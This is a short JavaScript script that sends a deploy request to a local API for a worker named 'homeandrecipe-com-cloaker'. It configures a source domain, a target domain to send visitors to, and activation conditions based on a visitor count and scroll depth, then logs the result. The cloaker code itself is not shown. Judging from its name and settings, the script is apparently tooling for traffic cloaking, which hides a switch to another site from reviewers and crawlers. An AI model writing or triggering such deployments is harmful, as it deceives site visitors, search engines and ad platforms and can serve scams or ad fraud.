async function triggerDeploy() {
  const res = await fetch('http://localhost:5050/api/deploy', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      sourceDomain: 'homeandrecipe.com',
      targetDomain: 'https://asqstyle.com',
      workerName: 'homeandrecipe-com-cloaker',
      activationMethod: 'visitor_threshold',
      scrollPct: 15,
      triggerCondition: 'both',
      thresholdCount: 8,
      includeWww: true
    })
  });
  const data = await res.json();
  console.log('Deploy Result:', data.success, data.message);
  if (data.logs) {
    data.logs.forEach(l => console.log(`[${l.type}] ${l.message}`));
  }
}

triggerDeploy().catch(console.error);
